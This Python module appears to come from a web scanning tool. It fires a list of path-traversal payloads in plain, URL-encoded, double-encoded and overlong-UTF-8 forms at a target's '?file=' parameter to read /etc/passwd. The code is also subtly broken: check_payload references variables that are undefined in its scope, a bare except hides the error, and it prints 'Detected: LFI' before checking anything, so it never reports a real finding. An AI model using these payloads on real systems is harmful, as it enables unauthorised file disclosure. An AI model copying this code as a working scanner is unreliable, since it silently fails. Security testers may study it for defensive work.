import requests
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from config import HTTP_HEADERS, DEFAULT_TIMEOUT
from module.other import Other

class LFIScanner:
    def __init__(self, args):
        self.target = args.target
        self.thread = args.threads
        self.payloads = [
            "../../../../etc/passwd",
            "../../../etc/passwd",
            "../../../../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "..%c0%af../etc/passwd",
            "..%c1%9c../etc/passwd",
            "..%e0%80%af../etc/passwd",
            "..\\..\\..\\etc\\passwd",
            "..%5c..%5c..%5cetc%5cpasswd",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "%2e%2e\\%2e%2e\\%2e%2e\\etc\\passwd"
        ]
        self.module_name = os.path.splitext(os.path.basename(__file__))[0]
        self.printer = Other()

    def check_payload(self, url):
        try:
            r = requests.get(url, headers=HTTP_HEADERS, timeout=DEFAULT_TIMEOUT, verify=False)
            colored_url = self.printer.color_text(result, "yellow")
            print(f"[*] [Module: {colored_module}] [Detected: LFI] [URL: {colored_url}]")

            if "root:x" in r.text:
                return url
        except:
            return None
        return None

    def run(self):
        colored_module = self.printer.color_text(self.module_name, "cyan")
        protocols = ["http", "https"]
        tasks = []

        with ThreadPoolExecutor(max_workers=self.thread) as executor:
            for proto in protocols:
                for payload in self.payloads:
                    url = f"{proto}://{self.target}/?file={payload}"
                    tasks.append(executor.submit(self.check_payload, url))

            results = []
            for future in as_completed(tasks):
                result = future.result()
                if result:
                    return [{"vulnerable": True, "payload": result}]

        print(f"[*] [Module: {colored_module}] No LFI detected.")
        return [{"vulnerable": False}]

def scan(args=None):
    return LFIScanner(args).run()
